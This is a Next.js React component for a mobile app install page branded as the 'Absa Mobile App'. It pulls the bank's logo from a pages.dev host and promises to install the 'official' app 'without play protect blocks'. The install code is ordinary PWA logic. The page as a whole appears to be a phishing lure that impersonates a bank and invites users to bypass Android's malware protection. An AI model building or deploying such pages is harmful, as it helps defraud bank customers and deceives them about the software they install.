'use client';

import { useState, useEffect } from 'react';
import Image from 'next/image';
import { Download, CheckCircle2 } from 'lucide-react';

export default function PwaInstallPage() {
  const [deferredPrompt, setDeferredPrompt] = useState(null);
  const [isInstalled, setIsInstalled] = useState(false);

  useEffect(() => {
    window.addEventListener('beforeinstallprompt', (e) => {
      e.preventDefault();
      setDeferredPrompt(e);
    });

    window.addEventListener('appinstalled', () => {
      setIsInstalled(true);
      setDeferredPrompt(null);
    });
  }, []);

  const handleInstallClick = async () => {
    if (deferredPrompt) {
      deferredPrompt.prompt();
      const { outcome } = await deferredPrompt.userChoice;
      if (outcome === 'accepted') {
        setIsInstalled(true);
        setDeferredPrompt(null);
      }
    } else {
      // Direct fallback to browser native menu
      alert('Tap Chrome Menu (3 dots) -> Select "Add to Home screen" / "Install app"');
    }
  };

  return (
    <div className="min-h-screen bg-[#FDF8FB] flex flex-col items-center justify-center px-6 py-10">
      <div className="w-full max-w-[360px] flex flex-col items-center text-center">
        
        <div className="relative w-40 h-40 rounded-full overflow-hidden mb-6">
          <Image
            src="https://absa-site.pages.dev/absa-logo.png"
            alt="Absa Logo"
            fill
            className="object-contain"
            priority
            unoptimized
          />
        </div>

        <h1 className="text-2xl font-bold text-[#1C1C1C] mb-2">Absa Mobile App</h1>
        <p className="text-[#524B53] text-sm mb-8">
          Install official Absa app directly to your device without play protect blocks.
        </p>

        <button
          type="button"
          onClick={handleInstallClick}
          className="w-full bg-[#DC1B42] hover:bg-[#c01337] active:scale-[0.99] text-white font-semibold py-4 rounded-xl text-[16px] shadow-lg flex items-center justify-center gap-2 transition-all"
        >
          {isInstalled ? (
            <>
              <CheckCircle2 size={20} />
              <span>App Installed</span>
            </>
          ) : (
            <>
              <Download size={20} />
              <span>Install App Directly</span>
            </>
          )}
        </button>
      </div>
    </div>
  );
}
